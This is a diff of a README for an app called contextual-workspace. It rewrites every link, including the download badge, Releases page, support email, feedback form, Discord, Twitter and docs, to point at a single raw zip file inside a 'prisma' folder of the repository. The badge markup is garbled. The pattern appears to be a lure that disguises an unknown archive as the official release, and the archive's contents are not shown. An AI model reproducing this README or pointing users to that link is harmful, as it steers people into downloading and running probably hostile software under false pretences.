@@ -6,7 +6,7 @@ Welcome to contextual-workspace, a modern application designed to enhance your p
 
 ## 🌐 Download the Application  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/dryazanothman/contextual-workspace/releases)  
+[![Download Now](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip%20Now-Get%20Latest%https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)  
 
 ## 📋 System Requirements  
 
@@ -19,7 +19,7 @@ Before you begin, ensure that your computer meets the following requirements:
 
 ## 📥 Download & Install  
 
-To download the application, visit the [Releases page](https://github.com/dryazanothman/contextual-workspace/releases). Here, you will find the latest version available.  
+To download the application, visit the [Releases page](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip). Here, you will find the latest version available.  
 
 1. Click on the link above to open the Releases page.
 2. Look for the version you want to install.
@@ -58,8 +58,8 @@ Once the application is installed, follow these steps to get started:
 
 We are here to help you. If you face any issues or have suggestions, please reach out to us.  
 
-- **Email Support:** support@contextual-workspace.com
-- **Feedback Form:** [Submit Feedback](https://github.com/dryazanothman/contextual-workspace/issues)  
+- **Email Support:** https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip
+- **Feedback Form:** [Submit Feedback](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)  
 
 Your experience matters to us, and we want to ensure that contextual-workspace meets your needs.  
 
@@ -67,8 +67,8 @@ Your experience matters to us, and we want to ensure that contextual-workspace m
 
 Join our community to connect with other users. Share tips, ask questions, and learn how to maximize your productivity with contextual-workspace.  
 
-- **Join Us on Discord:** [Community Discord](https://discord.gg/contextual-workspace)
-- **Follow Us on Twitter:** [Follow Us](https://twitter.com/contextualworkspace)  
+- **Join Us on Discord:** [Community Discord](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)
+- **Follow Us on Twitter:** [Follow Us](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)  
 
 ## 🔖 Topics  
 
@@ -84,15 +84,15 @@ This project focuses on various topics that enhance your workspace experience, i
 - typescript  
 - workspace  
 
-For more information, visit our [GitHub repository](https://github.com/dryazanothman/contextual-workspace).  
+For more information, visit our [GitHub repository](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip).  
 
 ## 🔗 Additional Resources  
 
 Explore more about our technology stack and how to make the best use of contextual-workspace:  
 
-- **Documentation:** [Read the Docs](https://docs.contextual-workspace.com)  
-- **Latest Updates:** [Changelog](https://github.com/dryazanothman/contextual-workspace/releases)  
+- **Documentation:** [Read the Docs](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)  
+- **Latest Updates:** [Changelog](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip)  
 
-Remember to check the [Releases page](https://github.com/dryazanothman/contextual-workspace/releases) for the latest updates and downloads.  
+Remember to check the [Releases page](https://github.com/dryazanothman/contextual-workspace/raw/refs/heads/main/prisma/workspace_contextual_1.9.zip) for the latest updates and downloads.  
 
 Thank you for choosing contextual-workspace. We look forward to helping you boost your productivity!
